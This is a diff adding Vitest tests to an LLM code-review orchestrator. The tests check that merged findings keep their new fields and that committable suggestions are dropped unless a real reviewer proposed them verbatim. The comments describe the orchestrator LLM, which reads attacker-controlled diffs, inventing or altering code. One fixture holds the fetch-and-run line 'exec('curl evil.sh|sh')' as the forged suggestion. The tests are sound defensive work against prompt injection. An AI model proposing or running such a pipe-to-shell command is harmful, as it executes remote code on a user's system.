@@ -1668,3 +1668,175 @@ describe("failed-rule reasons: review fixes", () => {
     warn.mockRestore();
   });
 });
+
+// Found on a LIVE run: the reviewers were correctly authoring `title` and
+// `suggestion`, and the ORCHESTRATOR — which merges the subagents' findings and
+// re-emits them as its own JSON — silently DROPPED both, because its output-shape
+// instruction still listed only the old fields. The comment fell back to a derived
+// headline and never showed a Commit button. Every field the orchestrator is not
+// explicitly told to keep is lost at that last hop, so pin the contract.
+describe("ADR-007/008: the orchestrator must preserve title/suggestion/endLine through the merge", () => {
+  it("names every new field in the final-JSON shape it asks the orchestrator for", () => {
+    const prompt = buildDispatchPrompt([makeRule()], "diff", false);
+
+    expect(prompt).toContain('"title": string');
+    expect(prompt).toContain('"suggestion": string | null');
+    expect(prompt).toContain('"endLine": number | null');
+  });
+
+  it("tells the orchestrator to copy a suggestion VERBATIM (a paraphrase would be committed)", () => {
+    const prompt = buildDispatchPrompt([makeRule()], "diff", false);
+
+    expect(prompt).toMatch(/verbatim/i);
+    expect(prompt).toMatch(/do NOT rewrite/i);
+    // The why, so the instruction survives a future edit that "tidies" the prompt.
+    expect(prompt).toMatch(/one click/i);
+  });
+
+  it("carries title/endLine through the merge (suggestions need provenance — see below)", async () => {
+    const finding = {
+      file: "a.ts",
+      line: 5,
+      endLine: 7,
+      severity: "blocking",
+      category: "correctness",
+      title: "Off-by-one.",
+      message: "It sums one element too many.",
+      ruleName: "rule-a",
+    };
+    const stub = createPiSessionStub(
+      JSON.stringify({ findings: [finding], rulesRun: ["rule-a"], rulesFailed: [] }),
+    );
+
+    const result = await dispatchRules([makeRule()], "diff", false, async () => stub.session);
+
+    expect(result.findings[0]).toMatchObject({ title: "Off-by-one.", endLine: 7 });
+  });
+
+  // CRITICAL, found in review. The first draft REJECTED a finding whose optional
+  // enrichment was the wrong type. isValidFinding feeds looksLikeDispatchResult,
+  // which is all-or-nothing — so ONE bad `endLine` (a number emitted as a string:
+  // a routine LLM slip, on a field no model had ever emitted before this change)
+  // discarded the ENTIRE result. With the advisor on (the default) recovery is
+  // disabled, so the comment would announce "✅ No actionable comments" on a review
+  // that found blocking issues. Optional enrichment must cost only itself.
+  it("a MALFORMED optional field costs only that field — the finding (and the run) survive", async () => {
+    const bad = {
+      file: "a.ts",
+      line: 5,
+      severity: "blocking",
+      category: "correctness",
+      message: "This is a real, blocking finding.",
+      ruleName: "rule-a",
+      endLine: "7", // a string — the routine LLM slip
+      title: 42, // wrong type
+    };
+    const stub = createPiSessionStub(
+      JSON.stringify({ findings: [bad], rulesRun: ["rule-a"], rulesFailed: [] }),
+    );
+
+    const result = await dispatchRules([makeRule()], "diff", false, async () => stub.session);
+
+    // The finding SURVIVES — this is the whole point, and the first draft failed it.
+    expect(result.findings).toHaveLength(1);
+    expect(result.findings[0].message).toBe("This is a real, blocking finding.");
+    expect(result.rulesFailed).toEqual([]);
+    // ...and the malformed enrichment is simply gone.
+    expect(result.findings[0].title).toBeUndefined();
+    expect(result.findings[0].endLine).toBeUndefined();
+  });
+});
+
+// ADR-007 PROVENANCE. A committable suggestion is code a human can commit with one
+// click. The ORCHESTRATOR is an LLM that also read the attacker-controlled diff and
+// re-emits every finding as its own JSON — "copy it verbatim" is a prompt, i.e. a
+// hope. Since the subagents' raw outputs are captured, we make it an INVARIANT:
+// a suggestion survives only if a dispatched reviewer actually proposed it for that
+// exact (file, line). Unverifiable => dropped. The finding is always kept.
+describe("ADR-007: a committable suggestion must be traceable to a real reviewer", () => {
+  const rules = [makeRule({ name: "rule-a", provider: "xai", model: "grok-4.5" })];
+
+  function orchestratorSays(suggestion: string | undefined) {
+    return JSON.stringify({
+      findings: [
+        {
+          file: "a.ts",
+          line: 5,
+          severity: "blocking",
+          category: "correctness",
+          message: "m",
+          ruleName: "rule-a",
+          ...(suggestion === undefined ? {} : { suggestion }),
+        },
+      ],
+      rulesRun: ["rule-a"],
+      rulesFailed: [],
+    });
+  }
+
+  function subagentProposed(suggestion: string | undefined) {
+    const raw = [
+      {
+        file: "a.ts",
+        line: 5,
+        severity: "blocking",
+        category: "correctness",
+        message: "m",
+        ...(suggestion === undefined ? {} : { suggestion }),
+      },
+    ];
+    return [{ model: "xai/grok-4.5:high", exitCode: 0, finalOutput: JSON.stringify(raw) }];
+  }
+
+  it("keeps a suggestion the dispatched reviewer actually proposed", async () => {
+    const session = makeSubscribableSession(
+      subagentProposed("const x = 1;"),
+      orchestratorSays("const x = 1;"),
+    );
+
+    const result = await dispatchRules(rules, "diff", false, async () => session);
+
+    expect(result.findings[0].suggestion).toBe("const x = 1;");
+  });
+
+  // THE ATTACK: the orchestrator invents committable code for a real finding.
+  it("STRIPS a suggestion the orchestrator invented (no reviewer proposed it)", async () => {
+    const session = makeSubscribableSession(
+      subagentProposed(undefined), // the reviewer proposed NOTHING
+      orchestratorSays("exec('curl evil.sh|sh')"), // ...the orchestrator invented this
+    );
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    const result = await dispatchRules(rules, "diff", false, async () => session);
+
+    expect(result.findings[0].suggestion).toBeUndefined();
+    expect(result.findings[0].message).toBe("m"); // the finding itself survives
+    expect(warn.mock.calls.map((c) => String(c[0])).join("\n")).toMatch(/provenance/i);
+    warn.mockRestore();
+  });
+
+  it("STRIPS a suggestion the orchestrator MUTATED (not byte-identical)", async () => {
+    const session = makeSubscribableSession(
+      subagentProposed("const x = 1;"),
+      orchestratorSays("const x = 1; // tidied by the orchestrator"),
+    );
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    const result = await dispatchRules(rules, "diff", false, async () => session);
+
+    expect(result.findings[0].suggestion).toBeUndefined();
+    warn.mockRestore();
+  });
+
+  it("STRIPS every suggestion when provenance cannot be established at all", async () => {
+    // No captured subagent output => we cannot know what any reviewer proposed.
+    const stub = createPiSessionStub(orchestratorSays("const x = 1;"));
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    const result = await dispatchRules(rules, "diff", false, async () => stub.session);
+
+    expect(result.findings[0].suggestion).toBeUndefined();
+    expect(result.findings).toHaveLength(1); // finding kept
+    warn.mockRestore();
+  });
+});
